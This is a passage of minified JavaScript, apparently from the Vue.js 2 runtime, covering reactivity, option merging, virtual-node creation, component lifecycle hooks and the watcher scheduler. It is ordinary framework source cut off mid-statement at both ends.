N=["component","directive","filter"],O=["beforeCreate","created","beforeMount","mounted","beforeUpdate","updated","beforeDestroy","destroyed","activated","deactivated","errorCaptured","serverPrefetch"],P={optionMergeStrategies:Object.create(null),silent:!1,productionTip:!1,devtools:!1,performance:!1,errorHandler:null,warnHandler:null,ignoredElements:[],keyCodes:Object.create(null),isReservedTag:D,isReservedAttr:D,isUnknownElement:D,getTagNamespace:I,parsePlatformTagName:z,mustUseProp:D,async:!0,_lifecycleHooks:O},M=/a-zA-Z\u00B7\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u037D\u037F-\u1FFF\u200C-\u200D\u203F-\u2040\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD/;function q(n,e,t,o){Object.defineProperty(n,e,{value:t,enumerable:!!o,writable:!0,configurable:!0})}var V=new RegExp("[^"+M.source+".$_\\d]");var $,U="__proto__"in{},H="undefined"!=typeof window,G="undefined"!=typeof WXEnvironment&&!!WXEnvironment.platform,W=G&&WXEnvironment.platform.toLowerCase(),Y=H&&window.navigator.userAgent.toLowerCase(),J=Y&&/msie|trident/.test(Y),X=Y&&Y.indexOf("msie 9.0")>0,K=Y&&Y.indexOf("edge/")>0,Q=(Y&&Y.indexOf("android"),Y&&/iphone|ipad|ipod|ios/.test(Y)||"ios"===W),Z=(Y&&/chrome\/\d+/.test(Y),Y&&/phantomjs/.test(Y),Y&&Y.match(/firefox\/(\d+)/)),nn={}.watch,en=!1;if(H)try{var tn={};Object.defineProperty(tn,"passive",{get:function(){en=!0}}),window.addEventListener("test-passive",null,tn)}catch(n){}var on=function(){return void 0===$&&($=!H&&!G&&"undefined"!=typeof global&&(global.process&&"server"===global.process.env.VUE_ENV)),$},an=H&&window.__VUE_DEVTOOLS_GLOBAL_HOOK__;function rn(n){return"function"==typeof n&&/native code/.test(n.toString())}var sn,ln="undefined"!=typeof Symbol&&rn(Symbol)&&"undefined"!=typeof Reflect&&rn(Reflect.ownKeys);sn="undefined"!=typeof Set&&rn(Set)?Set:function(){function n(){this.set=Object.create(null)}return n.prototype.has=function(n){return!0===this.set[n]},n.prototype.add=function(n){this.set[n]=!0},n.prototype.clear=function(){this.set=Object.create(null)},n}();var dn=I,cn=0,pn=function(){this.id=cn++,this.subs=[]};pn.prototype.addSub=function(n){this.subs.push(n)},pn.prototype.removeSub=function(n){f(this.subs,n)},pn.prototype.depend=function(){pn.target&&pn.target.addDep(this)},pn.prototype.notify=function(){var n=this.subs.slice();for(var e=0,t=n.length;e<t;e++)n[e].update()},pn.target=null;var un=[];function mn(n){un.push(n),pn.target=n}function hn(){un.pop(),pn.target=un[un.length-1]}var vn=function(n,e,t,o,a,r,s,i){this.tag=n,this.data=e,this.children=t,this.text=o,this.elm=a,this.ns=void 0,this.context=r,this.fnContext=void 0,this.fnOptions=void 0,this.fnScopeId=void 0,this.key=e&&e.key,this.componentOptions=s,this.componentInstance=void 0,this.parent=void 0,this.raw=!1,this.isStatic=!1,this.isRootInsert=!0,this.isComment=!1,this.isCloned=!1,this.isOnce=!1,this.asyncFactory=i,this.asyncMeta=void 0,this.isAsyncPlaceholder=!1},bn={child:{configurable:!0}};bn.child.get=function(){return this.componentInstance},Object.defineProperties(vn.prototype,bn);var gn=function(n){void 0===n&&(n="");var e=new vn;return e.text=n,e.isComment=!0,e};function fn(n){return new vn(void 0,void 0,void 0,String(n))}function xn(n){var e=new vn(n.tag,n.data,n.children&&n.children.slice(),n.text,n.elm,n.context,n.componentOptions,n.asyncFactory);return e.ns=n.ns,e.isStatic=n.isStatic,e.key=n.key,e.isComment=n.isComment,e.fnContext=n.fnContext,e.fnOptions=n.fnOptions,e.fnScopeId=n.fnScopeId,e.asyncMeta=n.asyncMeta,e.isCloned=!0,e}var yn=Array.prototype,wn=Object.create(yn);["push","pop","shift","unshift","splice","sort","reverse"].forEach((function(n){var e=yn[n];q(wn,n,(function(){for(var t=[],o=arguments.length;o--;)t[o]=arguments[o];var a,r=e.apply(this,t),s=this.__ob__;switch(n){case"push":case"unshift":a=t;break;case"splice":a=t.slice(2)}return a&&s.observeArray(a),s.dep.notify(),r}))}));var En=Object.getOwnPropertyNames(wn),kn=!0;function An(n){kn=n}var jn=function(n){this.value=n,this.dep=new pn,this.vmCount=0,q(n,"__ob__",this),Array.isArray(n)?(U?function(n,e){n.__proto__=e}(n,wn):function(n,e,t){for(var o=0,a=t.length;o<a;o++){var r=t[o];q(n,r,e[r])}}(n,wn,En),this.observeArray(n)):this.walk(n)};function Tn(n,e){var t;if(l(n)&&!(n instanceof vn))return y(n,"__ob__")&&n.__ob__ instanceof jn?t=n.__ob__:kn&&!on()&&(Array.isArray(n)||c(n))&&Object.isExtensible(n)&&!n._isVue&&(t=new jn(n)),e&&t&&t.vmCount++,t}function Bn(n,e,t,o,a){var r=new pn,s=Object.getOwnPropertyDescriptor(n,e);if(!s||!1!==s.configurable){var i=s&&s.get,l=s&&s.set;i&&!l||2!==arguments.length||(t=n[e]);var d=!a&&Tn(t);Object.defineProperty(n,e,{enumerable:!0,configurable:!0,get:function(){var e=i?i.call(n):t;return pn.target&&(r.depend(),d&&(d.dep.depend(),Array.isArray(e)&&Cn(e))),e},set:function(e){var o=i?i.call(n):t;e===o||e!=e&&o!=o||i&&!l||(l?l.call(n,e):t=e,d=!a&&Tn(e),r.notify())}})}}function _n(n,e,t){if(Array.isArray(n)&&u(e))return n.length=Math.max(n.length,e),n.splice(e,1,t),t;if(e in n&&!(e in Object.prototype))return n[e]=t,t;var o=n.__ob__;return n._isVue||o&&o.vmCount?t:o?(Bn(o.value,e,t),o.dep.notify(),t):(n[e]=t,t)}function Sn(n,e){if(Array.isArray(n)&&u(e))n.splice(e,1);else{var t=n.__ob__;n._isVue||t&&t.vmCount||y(n,e)&&(delete n[e],t&&t.dep.notify())}}function Cn(n){for(var e=void 0,t=0,o=n.length;t<o;t++)(e=n[t])&&e.__ob__&&e.__ob__.dep.depend(),Array.isArray(e)&&Cn(e)}jn.prototype.walk=function(n){for(var e=Object.keys(n),t=0;t<e.length;t++)Bn(n,e[t])},jn.prototype.observeArray=function(n){for(var e=0,t=n.length;e<t;e++)Tn(n[e])};var In=P.optionMergeStrategies;function Dn(n,e){if(!e)return n;for(var t,o,a,r=ln?Reflect.ownKeys(e):Object.keys(e),s=0;s<r.length;s++)"__ob__"!==(t=r[s])&&(o=n[t],a=e[t],y(n,t)?o!==a&&c(o)&&c(a)&&Dn(o,a):_n(n,t,a));return n}function zn(n,e,t){return t?function(){var o="function"==typeof e?e.call(t,t):e,a="function"==typeof n?n.call(t,t):n;return o?Dn(o,a):a}:e?n?function(){return Dn("function"==typeof e?e.call(this,this):e,"function"==typeof n?n.call(this,this):n)}:e:n}function Rn(n,e){var t=e?n?n.concat(e):Array.isArray(e)?e:[e]:n;return t?function(n){for(var e=[],t=0;t<n.length;t++)-1===e.indexOf(n[t])&&e.push(n[t]);return e}(t):t}function Ln(n,e,t,o){var a=Object.create(n||null);return e?S(a,e):a}In.data=function(n,e,t){return t?zn(n,e,t):e&&"function"!=typeof e?n:zn(n,e)},O.forEach((function(n){In[n]=Rn})),N.forEach((function(n){In[n+"s"]=Ln})),In.watch=function(n,e,t,o){if(n===nn&&(n=void 0),e===nn&&(e=void 0),!e)return Object.create(n||null);if(!n)return e;var a={};for(var r in S(a,n),e){var s=a[r],i=e[r];s&&!Array.isArray(s)&&(s=[s]),a[r]=s?s.concat(i):Array.isArray(i)?i:[i]}return a},In.props=In.methods=In.inject=In.computed=function(n,e,t,o){if(!n)return e;var a=Object.create(null);return S(a,n),e&&S(a,e),a},In.provide=zn;var Fn=function(n,e){return void 0===e?n:e};function Nn(n,e,t){if("function"==typeof e&&(e=e.options),function(n,e){var t=n.props;if(t){var o,a,r={};if(Array.isArray(t))for(o=t.length;o--;)"string"==typeof(a=t[o])&&(r[k(a)]={type:null});else if(c(t))for(var s in t)a=t[s],r[k(s)]=c(a)?a:{type:a};else 0;n.props=r}}(e),function(n,e){var t=n.inject;if(t){var o=n.inject={};if(Array.isArray(t))for(var a=0;a<t.length;a++)o[t[a]]={from:t[a]};else if(c(t))for(var r in t){var s=t[r];o[r]=c(s)?S({from:r},s):{from:s}}else 0}}(e),function(n){var e=n.directives;if(e)for(var t in e){var o=e[t];"function"==typeof o&&(e[t]={bind:o,update:o})}}(e),!e._base&&(e.extends&&(n=Nn(n,e.extends,t)),e.mixins))for(var o=0,a=e.mixins.length;o<a;o++)n=Nn(n,e.mixins[o],t);var r,s={};for(r in n)i(r);for(r in e)y(n,r)||i(r);function i(o){var a=In[o]||Fn;s[o]=a(n[o],e[o],t,o)}return s}function On(n,e,t,o){if("string"==typeof t){var a=n[e];if(y(a,t))return a[t];var r=k(t);if(y(a,r))return a[r];var s=A(r);return y(a,s)?a[s]:a[t]||a[r]||a[s]}}function Pn(n,e,t,o){var a=e[n],r=!y(t,n),s=t[n],i=$n(Boolean,a.type);if(i>-1)if(r&&!y(a,"default"))s=!1;else if(""===s||s===T(n)){var l=$n(String,a.type);(l<0||i<l)&&(s=!0)}if(void 0===s){s=function(n,e,t){if(!y(e,"default"))return;var o=e.default;0;if(n&&n.$options.propsData&&void 0===n.$options.propsData[t]&&void 0!==n._props[t])return n._props[t];return"function"==typeof o&&"Function"!==qn(e.type)?o.call(n):o}(o,a,n);var d=kn;An(!0),Tn(s),An(d)}return s}var Mn=/^\s*function (\w+)/;function qn(n){var e=n&&n.toString().match(Mn);return e?e[1]:""}function Vn(n,e){return qn(n)===qn(e)}function $n(n,e){if(!Array.isArray(e))return Vn(e,n)?0:-1;for(var t=0,o=e.length;t<o;t++)if(Vn(e[t],n))return t;return-1}function Un(n,e,t){mn();try{if(e)for(var o=e;o=o.$parent;){var a=o.$options.errorCaptured;if(a)for(var r=0;r<a.length;r++)try{if(!1===a[r].call(o,n,e,t))return}catch(n){Gn(n,o,"errorCaptured hook")}}Gn(n,e,t)}finally{hn()}}function Hn(n,e,t,o,a){var r;try{(r=t?n.apply(e,t):n.call(e))&&!r._isVue&&m(r)&&!r._handled&&(r.catch((function(n){return Un(n,o,a+" (Promise/async)")})),r._handled=!0)}catch(n){Un(n,o,a)}return r}function Gn(n,e,t){if(P.errorHandler)try{return P.errorHandler.call(null,n,e,t)}catch(e){e!==n&&Wn(e,null,"config.errorHandler")}Wn(n,e,t)}function Wn(n,e,t){if(!H&&!G||"undefined"==typeof console)throw n;console.error(n)}var Yn,Jn=!1,Xn=[],Kn=!1;function Qn(){Kn=!1;var n=Xn.slice(0);Xn.length=0;for(var e=0;e<n.length;e++)n[e]()}if("undefined"!=typeof Promise&&rn(Promise)){var Zn=Promise.resolve();Yn=function(){Zn.then(Qn),Q&&setTimeout(I)},Jn=!0}else if(J||"undefined"==typeof MutationObserver||!rn(MutationObserver)&&"[object MutationObserverConstructor]"!==MutationObserver.toString())Yn="undefined"!=typeof setImmediate&&rn(setImmediate)?function(){setImmediate(Qn)}:function(){setTimeout(Qn,0)};else{var ne=1,ee=new MutationObserver(Qn),te=document.createTextNode(String(ne));ee.observe(te,{characterData:!0}),Yn=function(){ne=(ne+1)%2,te.data=String(ne)},Jn=!0}function oe(n,e){var t;if(Xn.push((function(){if(n)try{n.call(e)}catch(n){Un(n,e,"nextTick")}else t&&t(e)})),Kn||(Kn=!0,Yn()),!n&&"undefined"!=typeof Promise)return new Promise((function(n){t=n}))}var ae=new sn;function re(n){!function n(e,t){var o,a,r=Array.isArray(e);if(!r&&!l(e)||Object.isFrozen(e)||e instanceof vn)return;if(e.__ob__){var s=e.__ob__.dep.id;if(t.has(s))return;t.add(s)}if(r)for(o=e.length;o--;)n(e[o],t);else for(a=Object.keys(e),o=a.length;o--;)n(e[a[o]],t)}(n,ae),ae.clear()}var se=w((function(n){var e="&"===n.charAt(0),t="~"===(n=e?n.slice(1):n).charAt(0),o="!"===(n=t?n.slice(1):n).charAt(0);return{name:n=o?n.slice(1):n,once:t,capture:o,passive:e}}));function ie(n,e){function t(){var n=arguments,o=t.fns;if(!Array.isArray(o))return Hn(o,null,arguments,e,"v-on handler");for(var a=o.slice(),r=0;r<a.length;r++)Hn(a[r],null,n,e,"v-on handler")}return t.fns=n,t}function le(n,e,t,o,r,i){var l,d,c,p;for(l in n)d=n[l],c=e[l],p=se(l),a(d)||(a(c)?(a(d.fns)&&(d=n[l]=ie(d,i)),s(p.once)&&(d=n[l]=r(p.name,d,p.capture)),t(p.name,d,p.capture,p.passive,p.params)):d!==c&&(c.fns=d,n[l]=c));for(l in e)a(n[l])&&o((p=se(l)).name,e[l],p.capture)}function de(n,e,t){var o;n instanceof vn&&(n=n.data.hook||(n.data.hook={}));var i=n[e];function l(){t.apply(this,arguments),f(o.fns,l)}a(i)?o=ie([l]):r(i.fns)&&s(i.merged)?(o=i).fns.push(l):o=ie([i,l]),o.merged=!0,n[e]=o}function ce(n,e,t,o,a){if(r(e)){if(y(e,t))return n[t]=e[t],a||delete e[t],!0;if(y(e,o))return n[t]=e[o],a||delete e[o],!0}return!1}function pe(n){return i(n)?[fn(n)]:Array.isArray(n)?function n(e,t){var o,l,d,c,p=[];for(o=0;o<e.length;o++)a(l=e[o])||"boolean"==typeof l||(d=p.length-1,c=p[d],Array.isArray(l)?l.length>0&&(ue((l=n(l,(t||"")+"_"+o))[0])&&ue(c)&&(p[d]=fn(c.text+l[0].text),l.shift()),p.push.apply(p,l)):i(l)?ue(c)?p[d]=fn(c.text+l):""!==l&&p.push(fn(l)):ue(l)&&ue(c)?p[d]=fn(c.text+l.text):(s(e._isVList)&&r(l.tag)&&a(l.key)&&r(t)&&(l.key="__vlist"+t+"_"+o+"__"),p.push(l)));return p}(n):void 0}function ue(n){return r(n)&&r(n.text)&&!1===n.isComment}function me(n,e){if(n){for(var t=Object.create(null),o=ln?Reflect.ownKeys(n):Object.keys(n),a=0;a<o.length;a++){var r=o[a];if("__ob__"!==r){for(var s=n[r].from,i=e;i;){if(i._provided&&y(i._provided,s)){t[r]=i._provided[s];break}i=i.$parent}if(!i)if("default"in n[r]){var l=n[r].default;t[r]="function"==typeof l?l.call(e):l}else 0}}return t}}function he(n,e){if(!n||!n.length)return{};for(var t={},o=0,a=n.length;o<a;o++){var r=n[o],s=r.data;if(s&&s.attrs&&s.attrs.slot&&delete s.attrs.slot,r.context!==e&&r.fnContext!==e||!s||null==s.slot)(t.default||(t.default=[])).push(r);else{var i=s.slot,l=t[i]||(t[i]=[]);"template"===r.tag?l.push.apply(l,r.children||[]):l.push(r)}}for(var d in t)t[d].every(ve)&&delete t[d];return t}function ve(n){return n.isComment&&!n.asyncFactory||" "===n.text}function be(n){return n.isComment&&n.asyncFactory}function ge(n,e,t){var a,r=Object.keys(e).length>0,s=n?!!n.$stable:!r,i=n&&n.$key;if(n){if(n._normalized)return n._normalized;if(s&&t&&t!==o&&i===t.$key&&!r&&!t.$hasNormal)return t;for(var l in a={},n)n[l]&&"$"!==l[0]&&(a[l]=fe(e,l,n[l]))}else a={};for(var d in e)d in a||(a[d]=xe(e,d));return n&&Object.isExtensible(n)&&(n._normalized=a),q(a,"$stable",s),q(a,"$key",i),q(a,"$hasNormal",r),a}function fe(n,e,t){var o=function(){var n=arguments.length?t.apply(null,arguments):t({}),e=(n=n&&"object"==typeof n&&!Array.isArray(n)?[n]:pe(n))&&n[0];return n&&(!e||1===n.length&&e.isComment&&!be(e))?void 0:n};return t.proxy&&Object.defineProperty(n,e,{get:o,enumerable:!0,configurable:!0}),o}function xe(n,e){return function(){return n[e]}}function ye(n,e){var t,o,a,s,i;if(Array.isArray(n)||"string"==typeof n)for(t=new Array(n.length),o=0,a=n.length;o<a;o++)t[o]=e(n[o],o);else if("number"==typeof n)for(t=new Array(n),o=0;o<n;o++)t[o]=e(o+1,o);else if(l(n))if(ln&&n[Symbol.iterator]){t=[];for(var d=n[Symbol.iterator](),c=d.next();!c.done;)t.push(e(c.value,t.length)),c=d.next()}else for(s=Object.keys(n),t=new Array(s.length),o=0,a=s.length;o<a;o++)i=s[o],t[o]=e(n[i],i,o);return r(t)||(t=[]),t._isVList=!0,t}function we(n,e,t,o){var a,r=this.$scopedSlots[n];r?(t=t||{},o&&(t=S(S({},o),t)),a=r(t)||("function"==typeof e?e():e)):a=this.$slots[n]||("function"==typeof e?e():e);var s=t&&t.slot;return s?this.$createElement("template",{slot:s},a):a}function Ee(n){return On(this.$options,"filters",n)||z}function ke(n,e){return Array.isArray(n)?-1===n.indexOf(e):n!==e}function Ae(n,e,t,o,a){var r=P.keyCodes[e]||t;return a&&o&&!P.keyCodes[e]?ke(a,o):r?ke(r,n):o?T(o)!==e:void 0===n}function je(n,e,t,o,a){if(t)if(l(t)){var r;Array.isArray(t)&&(t=C(t));var s=function(s){if("class"===s||"style"===s||g(s))r=n;else{var i=n.attrs&&n.attrs.type;r=o||P.mustUseProp(e,i,s)?n.domProps||(n.domProps={}):n.attrs||(n.attrs={})}var l=k(s),d=T(s);l in r||d in r||(r[s]=t[s],a&&((n.on||(n.on={}))["update:"+s]=function(n){t[s]=n}))};for(var i in t)s(i)}else;return n}function Te(n,e){var t=this._staticTrees||(this._staticTrees=[]),o=t[n];return o&&!e||_e(o=t[n]=this.$options.staticRenderFns[n].call(this._renderProxy,null,this),"__static__"+n,!1),o}function Be(n,e,t){return _e(n,"__once__"+e+(t?"_"+t:""),!0),n}function _e(n,e,t){if(Array.isArray(n))for(var o=0;o<n.length;o++)n[o]&&"string"!=typeof n[o]&&Se(n[o],e+"_"+o,t);else Se(n,e,t)}function Se(n,e,t){n.isStatic=!0,n.key=e,n.isOnce=t}function Ce(n,e){if(e)if(c(e)){var t=n.on=n.on?S({},n.on):{};for(var o in e){var a=t[o],r=e[o];t[o]=a?[].concat(a,r):r}}else;return n}function Ie(n,e,t,o){e=e||{$stable:!t};for(var a=0;a<n.length;a++){var r=n[a];Array.isArray(r)?Ie(r,e,t):r&&(r.proxy&&(r.fn.proxy=!0),e[r.key]=r.fn)}return o&&(e.$key=o),e}function De(n,e){for(var t=0;t<e.length;t+=2){var o=e[t];"string"==typeof o&&o&&(n[e[t]]=e[t+1])}return n}function ze(n,e){return"string"==typeof n?e+n:n}function Re(n){n._o=Be,n._n=v,n._s=h,n._l=ye,n._t=we,n._q=R,n._i=L,n._m=Te,n._f=Ee,n._k=Ae,n._b=je,n._v=fn,n._e=gn,n._u=Ie,n._g=Ce,n._d=De,n._p=ze}function Le(n,e,t,a,r){var i,l=this,d=r.options;y(a,"_uid")?(i=Object.create(a))._original=a:(i=a,a=a._original);var c=s(d._compiled),p=!c;this.data=n,this.props=e,this.children=t,this.parent=a,this.listeners=n.on||o,this.injections=me(d.inject,a),this.slots=function(){return l.$slots||ge(n.scopedSlots,l.$slots=he(t,a)),l.$slots},Object.defineProperty(this,"scopedSlots",{enumerable:!0,get:function(){return ge(n.scopedSlots,this.slots())}}),c&&(this.$options=d,this.$slots=this.slots(),this.$scopedSlots=ge(n.scopedSlots,this.$slots)),d._scopeId?this._c=function(n,e,t,o){var r=Ve(i,n,e,t,o,p);return r&&!Array.isArray(r)&&(r.fnScopeId=d._scopeId,r.fnContext=a),r}:this._c=function(n,e,t,o){return Ve(i,n,e,t,o,p)}}function Fe(n,e,t,o,a){var r=xn(n);return r.fnContext=t,r.fnOptions=o,e.slot&&((r.data||(r.data={})).slot=e.slot),r}function Ne(n,e){for(var t in e)n[k(t)]=e[t]}Re(Le.prototype);var Oe={init:function(n,e){if(n.componentInstance&&!n.componentInstance._isDestroyed&&n.data.keepAlive){var t=n;Oe.prepatch(t,t)}else{(n.componentInstance=function(n,e){var t={_isComponent:!0,_parentVnode:n,parent:e},o=n.data.inlineTemplate;r(o)&&(t.render=o.render,t.staticRenderFns=o.staticRenderFns);return new n.componentOptions.Ctor(t)}(n,Ke)).$mount(e?n.elm:void 0,e)}},prepatch:function(n,e){var t=e.componentOptions;!function(n,e,t,a,r){0;var s=a.data.scopedSlots,i=n.$scopedSlots,l=!!(s&&!s.$stable||i!==o&&!i.$stable||s&&n.$scopedSlots.$key!==s.$key||!s&&n.$scopedSlots.$key),d=!!(r||n.$options._renderChildren||l);n.$options._parentVnode=a,n.$vnode=a,n._vnode&&(n._vnode.parent=a);if(n.$options._renderChildren=r,n.$attrs=a.data.attrs||o,n.$listeners=t||o,e&&n.$options.props){An(!1);for(var c=n._props,p=n.$options._propKeys||[],u=0;u<p.length;u++){var m=p[u],h=n.$options.props;c[m]=Pn(m,h,e,n)}An(!0),n.$options.propsData=e}t=t||o;var v=n.$options._parentListeners;n.$options._parentListeners=t,Xe(n,t,v),d&&(n.$slots=he(r,a.context),n.$forceUpdate());0}(e.componentInstance=n.componentInstance,t.propsData,t.listeners,e,t.children)},insert:function(n){var e,t=n.context,o=n.componentInstance;o._isMounted||(o._isMounted=!0,et(o,"mounted")),n.data.keepAlive&&(t._isMounted?((e=o)._inactive=!1,ot.push(e)):nt(o,!0))},destroy:function(n){var e=n.componentInstance;e._isDestroyed||(n.data.keepAlive?function n(e,t){if(t&&(e._directInactive=!0,Ze(e)))return;if(!e._inactive){e._inactive=!0;for(var o=0;o<e.$children.length;o++)n(e.$children[o]);et(e,"deactivated")}}(e,!0):e.$destroy())}},Pe=Object.keys(Oe);function Me(n,e,t,i,d){if(!a(n)){var c=t.$options._base;if(l(n)&&(n=c.extend(n)),"function"==typeof n){var p;if(a(n.cid)&&void 0===(n=function(n,e){if(s(n.error)&&r(n.errorComp))return n.errorComp;if(r(n.resolved))return n.resolved;var t=Ue;t&&r(n.owners)&&-1===n.owners.indexOf(t)&&n.owners.push(t);if(s(n.loading)&&r(n.loadingComp))return n.loadingComp;if(t&&!r(n.owners)){var o=n.owners=[t],i=!0,d=null,c=null;t.$on("hook:destroyed",(function(){return f(o,t)}));var p=function(n){for(var e=0,t=o.length;e<t;e++)o[e].$forceUpdate();n&&(o.length=0,null!==d&&(clearTimeout(d),d=null),null!==c&&(clearTimeout(c),c=null))},u=F((function(t){n.resolved=He(t,e),i?o.length=0:p(!0)})),h=F((function(e){r(n.errorComp)&&(n.error=!0,p(!0))})),v=n(u,h);return l(v)&&(m(v)?a(n.resolved)&&v.then(u,h):m(v.component)&&(v.component.then(u,h),r(v.error)&&(n.errorComp=He(v.error,e)),r(v.loading)&&(n.loadingComp=He(v.loading,e),0===v.delay?n.loading=!0:d=setTimeout((function(){d=null,a(n.resolved)&&a(n.error)&&(n.loading=!0,p(!1))}),v.delay||200)),r(v.timeout)&&(c=setTimeout((function(){c=null,a(n.resolved)&&h(null)}),v.timeout)))),i=!1,n.loading?n.loadingComp:n.resolved}}(p=n,c)))return function(n,e,t,o,a){var r=gn();return r.asyncFactory=n,r.asyncMeta={data:e,context:t,children:o,tag:a},r}(p,e,t,i,d);e=e||{},kt(n),r(e.model)&&function(n,e){var t=n.model&&n.model.prop||"value",o=n.model&&n.model.event||"input";(e.attrs||(e.attrs={}))[t]=e.model.value;var a=e.on||(e.on={}),s=a[o],i=e.model.callback;r(s)?(Array.isArray(s)?-1===s.indexOf(i):s!==i)&&(a[o]=[i].concat(s)):a[o]=i}(n.options,e);var u=function(n,e,t){var o=e.options.props;if(!a(o)){var s={},i=n.attrs,l=n.props;if(r(i)||r(l))for(var d in o){var c=T(d);ce(s,l,d,c,!0)||ce(s,i,d,c,!1)}return s}}(e,n);if(s(n.options.functional))return function(n,e,t,a,s){var i=n.options,l={},d=i.props;if(r(d))for(var c in d)l[c]=Pn(c,d,e||o);else r(t.attrs)&&Ne(l,t.attrs),r(t.props)&&Ne(l,t.props);var p=new Le(t,l,s,a,n),u=i.render.call(null,p._c,p);if(u instanceof vn)return Fe(u,t,p.parent,i,p);if(Array.isArray(u)){for(var m=pe(u)||[],h=new Array(m.length),v=0;v<m.length;v++)h[v]=Fe(m[v],t,p.parent,i,p);return h}}(n,u,e,t,i);var h=e.on;if(e.on=e.nativeOn,s(n.options.abstract)){var v=e.slot;e={},v&&(e.slot=v)}!function(n){for(var e=n.hook||(n.hook={}),t=0;t<Pe.length;t++){var o=Pe[t],a=e[o],r=Oe[o];a===r||a&&a._merged||(e[o]=a?qe(r,a):r)}}(e);var b=n.options.name||d;return new vn("vue-component-"+n.cid+(b?"-"+b:""),e,void 0,void 0,void 0,t,{Ctor:n,propsData:u,listeners:h,tag:d,children:i},p)}}}function qe(n,e){var t=function(t,o){n(t,o),e(t,o)};return t._merged=!0,t}function Ve(n,e,t,o,d,c){return(Array.isArray(t)||i(t))&&(d=o,o=t,t=void 0),s(c)&&(d=2),function(n,e,t,o,i){if(r(t)&&r(t.__ob__))return gn();r(t)&&r(t.is)&&(e=t.is);if(!e)return gn();0;Array.isArray(o)&&"function"==typeof o[0]&&((t=t||{}).scopedSlots={default:o[0]},o.length=0);2===i?o=pe(o):1===i&&(o=function(n){for(var e=0;e<n.length;e++)if(Array.isArray(n[e]))return Array.prototype.concat.apply([],n);return n}(o));var d,c;if("string"==typeof e){var p;c=n.$vnode&&n.$vnode.ns||P.getTagNamespace(e),d=P.isReservedTag(e)?new vn(P.parsePlatformTagName(e),t,o,void 0,void 0,n):t&&t.pre||!r(p=On(n.$options,"components",e))?new vn(e,t,o,void 0,void 0,n):Me(p,t,n,o,e)}else d=Me(e,t,n,o);return Array.isArray(d)?d:r(d)?(r(c)&&function n(e,t,o){e.ns=t,"foreignObject"===e.tag&&(t=void 0,o=!0);if(r(e.children))for(var i=0,l=e.children.length;i<l;i++){var d=e.children[i];r(d.tag)&&(a(d.ns)||s(o)&&"svg"!==d.tag)&&n(d,t,o)}}(d,c),r(t)&&function(n){l(n.style)&&re(n.style);l(n.class)&&re(n.class)}(t),d):gn()}(n,e,t,o,d)}var $e,Ue=null;function He(n,e){return(n.__esModule||ln&&"Module"===n[Symbol.toStringTag])&&(n=n.default),l(n)?e.extend(n):n}function Ge(n){if(Array.isArray(n))for(var e=0;e<n.length;e++){var t=n[e];if(r(t)&&(r(t.componentOptions)||be(t)))return t}}function We(n,e){$e.$on(n,e)}function Ye(n,e){$e.$off(n,e)}function Je(n,e){var t=$e;return function o(){var a=e.apply(null,arguments);null!==a&&t.$off(n,o)}}function Xe(n,e,t){$e=n,le(e,t||{},We,Ye,Je,n),$e=void 0}var Ke=null;function Qe(n){var e=Ke;return Ke=n,function(){Ke=e}}function Ze(n){for(;n&&(n=n.$parent);)if(n._inactive)return!0;return!1}function nt(n,e){if(e){if(n._directInactive=!1,Ze(n))return}else if(n._directInactive)return;if(n._inactive||null===n._inactive){n._inactive=!1;for(var t=0;t<n.$children.length;t++)nt(n.$children[t]);et(n,"activated")}}function et(n,e){mn();var t=n.$options[e],o=e+" hook";if(t)for(var a=0,r=t.length;a<r;a++)Hn(t[a],n,null,n,o);n._hasHookEvent&&n.$emit("hook:"+e),hn()}var tt=[],ot=[],at={},rt=!1,st=!1,it=0;var lt=0,dt=Date.now;if(H&&!J){var ct=window.performance;ct&&"function"==typeof ct.now&&dt()>document.createEvent("Event").timeStamp&&(dt=function(){return ct.now()})}function pt(){var n,e;for(lt=dt(),st=!0,tt.sort((function(n,e){return n.id-e.id})),it=0;it<tt.length;it++)(n=tt[it]).before&&n.before(),e=n.id,at[e]=null,n.run();var t=ot.slice(),o=tt.slice();it=tt.length=ot.length=0,at={},rt=st=!1,function(n){for(var e=0;e<n.length;e++)n[e]._inactive=!0,nt(n[e],!0)}(t),function(n){var e=n.length;for(;e--;){var t=n[e],o=t.vm;o._watcher===t&&o._isMounted&&!o._isDestroyed&&et(o,"updated")}}(o),an&&P.devtools&&an.emit("flush")}var ut=0,mt=function(n,e,t,o,a){this.vm=n,a&&(n._watcher=this),n._watchers.push(this),o?(this.deep=!!o.deep,this.user=!!o.user,this.lazy=!!o.lazy,this.sync=!!o.sync,this.before=o.before):this.deep=this.user=this.lazy=this.sync=!1,this.cb=t,this.id=++ut,this.active=!0,this.dirty=this.lazy,this.deps=[],this.newDeps=[],this.depIds=new sn,this.newDepIds=new sn,this.expression="","function"==typeof e?this.getter=e:(this.getter=function(n){if(!V.test(n)){var e=n.split(".");return function(n){for(var t=0;t<e.length;t++){if(!n)return;n=n[e[t]]}return n}}}(e),this.getter||(this.getter=I)),this.value=this.lazy?void 0:this.get()};mt.prototype.get=function(){var n;mn(this);var e=this.vm;try{n=this.getter.call(e,e)}catch(n){if(!this.user)throw n;Un(n,e,'getter for watcher "'+this.expression+'"')}finally{this.deep&&re(n),hn(),this.cleanupDeps()}return n},mt.prototype.addDep=function(n){var e=n.id;this.newDepIds.has(e)||(this.newDepIds.add(e),this.newDeps.push(n),this.depIds.has(e)||n.addSub(this))},mt.prototype.cleanupDeps=function(){for(var n=this.deps.length;n--;){var e=this.deps[n];this.newDepIds.has(e.id)||e.removeSub(this)}var t=this.depIds;this.depIds=this.newDepIds,this.newDepIds=t,this.newDepIds.clear(),t=this.deps,this.deps=this.newDeps,this.newDeps=t,this.newDeps.length=0},mt.prototype.update=function(){this.lazy?this.dirty=!0:this.sync?this.run():function(n){var e=n.id;if(null==at[e]){if(at[e]=!0,st){for(var t=tt.length-1;t>it&&tt[t].id>n.id;)t--;tt.splice(t+1,0,n)}else tt.push(n);rt||(rt=!0,oe(pt))}}(this)},mt.prototype.run=function(){if(this.active){var n=this.get();if(n!==this.value||l(n)||this.deep){var e=this.value;if(this.value=n,this.user){var t='callback for watcher "'+this.expression+'"';Hn(this.cb,this.vm,[n,e],this.vm,t)}else this.cb.call(this.vm,n,e)}}},mt.prototype.evaluate=function(){this.value=this.get(),this.dirty=!1},mt.prototype.depend=function(){for(var n=this.deps.length;n--;)this.deps[n].depend()},mt.prototype.teardown=function(){if(this.active){this.vm._isBeingDestroyed||f(this.vm._watchers,this);for(var 